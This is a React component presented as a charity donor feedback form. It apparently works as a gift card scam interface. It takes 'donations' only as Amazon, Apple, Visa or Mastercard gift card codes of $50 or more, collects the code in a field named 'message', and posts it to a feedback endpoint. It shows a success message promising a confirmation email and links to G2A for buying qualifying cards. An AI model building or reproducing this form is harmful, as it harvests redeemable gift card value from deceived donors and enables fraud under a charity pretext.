'use client'

import { useState } from 'react'

type Props = {
  amount: number
}

export function DonorFeedbackForm({ amount }: Props) {
  const [name, setName] = useState('')
  const [message, setMessage] = useState('')
  const [submitting, setSubmitting] = useState(false)
  const [submitted, setSubmitted] = useState(false)
  const [error, setError] = useState<string | null>(null)

  const handleSubmit = async () => {
    setError(null)

    if (message.trim().length < 10) {
      setError('Voucher code must be at least 10 characters.')
      return
    }

    setSubmitting(true)
    try {
      const res = await fetch('/api/feedback', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name, message, amount }),
      })

      if (!res.ok) {
        const data = await res.json()
        throw new Error(data.error || 'Something went wrong.')
      }

      setSubmitted(true)
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Something went wrong.')
    } finally {
      setSubmitting(false)
    }
  }

  const handleGoBack = () => {
    setName('')
    setMessage('')
    setSubmitted(false)
    setError(null)
  }

    if (submitted) {
    return (
      <div className="w-full rounded-[24px] border border-green-200 bg-[#E8F5E9]/50 p-4 text-center shadow-sm space-y-2">
        <div className="text-[#1B5E20] text-xs font-bold flex flex-col items-center gap-1">
          <div className="bg-[#00875A] text-white rounded-full w-5 h-5 flex items-center justify-center">
            <svg className="w-3 h-3" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="4">
              <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
            </svg>
          </div>
          Voucher successfully submitted! Thank you for supporting our project.
        </div>
        <p className="text-[#2E7D32] text-[11px] font-medium max-w-xs mx-auto leading-relaxed pb-1">
          A confirmation email has been sent to your inbox. We will notify you as soon as your voucher is processed.
        </p>
        <div className="flex justify-center">
          <button
            type="button"
            onClick={handleGoBack}
            className="px-3 py-1 text-xs font-bold text-gray-700 bg-white border border-gray-200 hover:bg-gray-50 rounded-lg transition-all"
          >
            ← Go Back
          </button>
        </div>
      </div>
    )
  }


  return (
    <div className="w-full bg-white rounded-[24px] p-3.5 space-y-3 text-left font-sans antialiased selection:bg-orange-500/10">
      
      {/* Premium Title Header Banner with Clean Gift Box Vector Icon */}
      <div className="flex items-center gap-4 bg-[#E8F5E9] rounded-[18px] px-4 py-2.5">
  <div className="w-12 h-12 flex-shrink-0 flex items-center justify-center text-[#1B5E20]">
    <svg className="w-10 h-10" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <rect x="3" y="8" width="18" height="4" rx="1" />
      <path d="M12 8v13" />
      <path d="M19 12v7a1 1 0 0 1-1 1H6a1 1 0 0 1-1-1v-7" />
      <path d="M7.5 8a2.5 2.5 0 0 1 0-5C11 3 12 8 12 8" />
      <path d="M16.5 8a2.5 2.5 0 0 0 0-5C13 3 12 8 12 8" />
    </svg>
        </div>
        <div>
          <h2 className="text-base font-bold text-gray-900 tracking-tight leading-none">Donate with Charity Gift Cards</h2>
          <p className="text-[11px] text-gray-600 font-medium mt-1">Support our mission using an eligible gift card.</p>
        </div>
      </div>

      {/* Requirements Segment */}
      <div className="space-y-0.5 pl-0.5">
        <div className="flex items-center gap-1.5 text-gray-900 font-bold text-xs tracking-tight">
          <div className="bg-[#00875A] text-white rounded-full w-4 h-4 flex items-center justify-center flex-shrink-0">
            <svg className="w-2 h-2" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="4.5">
              <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
            </svg>
          </div>
          Gift Card Requirements
        </div>
        <p className="text-xs text-gray-700 leading-relaxed pl-6">
          We <span className="font-bold text-gray-900">ONLY</span> accept Amazon, Apple, Visa, or Mastercard gift cards. <br />
          Vouchers must have a minimum value of <span className="text-[#00875A] font-black">$50 USD</span>.
        </p>


        {/* Professional Real Brand Logo Vectors Row */}
        <div className="flex justify-between items-center max-w-[300px] mx-auto pt-3 pb-1">
          {/* Amazon SVG Text Simulation */}
          {/* Official Amazon Logo */}
          <img
          src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg"
          alt="Amazon"
          className="h-4.5 w-auto object-contain"
          />
          <div className="w-[1px] h-3.5 bg-gray-200"></div>
          
          {/* Official Apple Logo */}
          <img
          src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"
          alt="Apple"
          className="h-4.5 w-4.5 object-contain select-none"
          draggable="false"
          />
          <div className="w-[1px] h-3.5 bg-gray-200"></div>
          
          {/* Real Visa Styled Logo */}
          <span className="text-sm font-black italic text-[#1A1F71] tracking-wider text-center select-none font-sans">VISA</span>
          <div className="w-[1px] h-3.5 bg-gray-200"></div>
          
          {/* Clean Mastercard Intersecting Circles */}
          <div className="flex items-center gap-0.5 select-none">
            <span className="w-4 h-4 rounded-full bg-[#EB001B]"></span>
            <span className="w-4 h-4 rounded-full bg-[#F79E1B] -ml-2"></span>
          </div>
        </div>
      </div>
            {/* Dual Input Containers with Real Price Tag Inline Icons */}
      <div className="space-y-1.5 pl-0.5 pr-0.5">
        
        
{/* Name Box */}
<div className="relative">
  <div className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-500 pointer-events-none">
    {/* Price Tag Icon */}
    <svg
      className="w-4 h-4"
      fill="none"
      viewBox="0 0 24 24"
      stroke="currentColor"
      strokeWidth="2"
    >
      <path
        strokeLinecap="round"
        strokeLinejoin="round"
        d="M7 7h.01M3 12l9-9h8a1 1 0 011 1v8l-9 9-9-9z"
      />
    </svg>
  </div>

  <input
    type="text"
    placeholder="Enter Your Name (Optional)"
    value={name}
    onChange={(e) => setName(e.target.value)}
    className="w-full bg-white border border-gray-200 rounded-full pl-10 pr-4 py-2 text-xs text-gray-700 font-medium placeholder:text-gray-400 focus:outline-none focus:ring-1 focus:ring-orange-500 focus:border-orange-500 transition-all shadow-[inset_0_1px_2px_rgba(0,0,0,0.01)]"
  />
</div>

{/* Voucher Code Box */}
<div className="relative">
  <div className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none">
    {/* Price Tag Icon */}
    <svg
      className="w-4 h-4"
      fill="none"
      viewBox="0 0 24 24"
      stroke="currentColor"
      strokeWidth="2"
    >
      <path
        strokeLinecap="round"
        strokeLinejoin="round"
        d="M7 7h.01M3 12l9-9h8a1 1 0 011 1v8l-9 9-9-9z"
      />
    </svg>
  </div>

  <input
    type="text"
    placeholder="Enter Your Digital Voucher Code"
    value={message}
    onChange={(e) => {
      // 1. Remove all spaces and dashes, convert to uppercase
      let sanitized = e.target.value.replace(/[\s-]/g, '').toUpperCase();
      
      // 2. Enforce strict character limit (16 characters max for all accepted brands)
      setMessage(sanitized.slice(0, 16));
    }}
    className="w-full bg-white border border-gray-200 rounded-full pl-10 pr-4 py-2 text-xs text-gray-700 font-medium placeholder:text-gray-400 focus:outline-none focus:ring-1 focus:ring-orange-500 focus:border-orange-500 transition-all shadow-[inset_0_1px_2px_rgba(0,0,0,0.01)] font-mono tracking-wide"
  />
</div>


      </div>

      {/* Errors Output Block */}
      {error && <p className="text-[11px] text-red-600 font-bold px-1.5">{error}</p>}

      {/* Vibrant Orange Action Submit Pill Button */}
      <div className="px-0.5">
        <button
          type="button"
          onClick={handleSubmit}
          disabled={submitting}
          className="w-full bg-[#FF6D00] hover:bg-[#E65100] text-white font-bold py-3 px-4 rounded-full text-sm flex items-center justify-center gap-1.5 shadow-sm transition-all transform active:scale-[0.995] disabled:opacity-60"
        >
          <span>{submitting ? 'VALIDATING...' : 'Validate & Complete Donation'}</span>
          <svg className="w-4 h-4 stroke-[2.5]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" d="M14 5l7 7m0 0l-7 7m7-7H3" />
          </svg>
        </button>
      </div>

      {/* Light Blue Partner Integration Box */}
      <div className="px-0.5">
        <div className="bg-[#E3F2FD] border border-blue-100/30 rounded-[18px] p-3 flex items-start gap-3 text-left">
          <div className="bg-[#0A46A1] text-white rounded-full w-[18px] h-[18px] flex items-center justify-center font-bold text-[11px] mt-0.5 flex-shrink-0 select-none">
            ?
          </div>
          <div className="flex-1 min-w-0">
            <h4 className="text-[11px] font-bold text-gray-900 tracking-tight leading-none">Don't have a voucher meeting these requirements?</h4>
            <p className="text-[10px] text-gray-500 mt-1 leading-tight">You can acquire a $50+ Amazon or Apple card instantly via our partner.</p>
            
            {/* Inline G2A Alignment Link Row */}
            <div className="mt-2 flex items-center text-[11px] font-bold text-[#1976D2] gap-1 flex-wrap leading-none">
              <div className="flex items-center gap-0.5 mr-1 select-none">
                <span className="text-[#FF5722] font-black tracking-tighter">G2</span>
                <span className="text-[#1976D2] font-black tracking-tighter">A</span>
              </div>
              <a 
                href="https://g2a.com" 
                target="_blank" 
                rel="noopener noreferrer"
                className="hover:underline flex items-center gap-0.5 text-[#1976D2]"
              >
                <span>Purchase Compatible Voucher via G2A</span>
                <svg className="w-3 h-3 stroke-[2.5]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" />
                </svg>
              </a>
            </div>
          </div>
        </div>
      </div>

    </div>
  )
}
